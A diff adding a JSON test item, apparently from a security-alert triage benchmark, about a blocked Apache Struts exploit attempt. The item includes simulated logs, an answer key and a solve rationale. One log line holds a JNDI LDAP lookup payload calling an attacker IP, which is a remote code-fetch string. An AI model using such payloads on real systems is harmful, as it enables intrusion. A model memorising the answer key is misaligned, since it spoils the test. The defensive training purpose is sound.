@@ -1,0 +1,78 @@
+{
+  "id": "A-1021",
+  "alert": {
+    "src": "203.0.113.88",
+    "dst": "10.2.4.26",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Apache Struts OGNL Injection",
+    "claimed_cve": "CVE-2017-5638",
+    "severity": "medium",
+    "ts": "2026-09-19T08:24:00Z",
+    "flow_id": "f1344"
+  },
+  "world": {
+    "assets": {
+      "10.2.4.26": {
+        "host": "host-10-2-4-26",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "apache-struts",
+            "version": "2.5.14"
+          }
+        },
+        "peers": [
+          "10.2.4.11"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2017-5638": {
+        "product": "apache-struts",
+        "patched_in": "2.5.13",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f1344": {
+        "direction": "inbound",
+        "bytes_out": 128,
+        "bytes_in": 340,
+        "duration_s": 1,
+        "state": "RST",
+        "note": "connection reset, no data exfil"
+      }
+    },
+    "logs": {
+      "host-10-2-4-26": [
+        "[host-10-2-4-26] 443 POST /api/x 403 jndi:ldap://203.0.113.88/a  <- payload rejected",
+        "[host-10-2-4-26] no new child processes"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-4-26": {
+        "suspicious": false,
+        "tree": "java (steady state, no children)",
+        "persistence": null
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.88",
+        "dst": "10.2.4.26",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "FAILED",
+    "action": "monitor"
+  },
+  "adversarial": false,
+  "solve_rationale": "target patched above patched_in; payload rejected; RST, no exfil"
+}
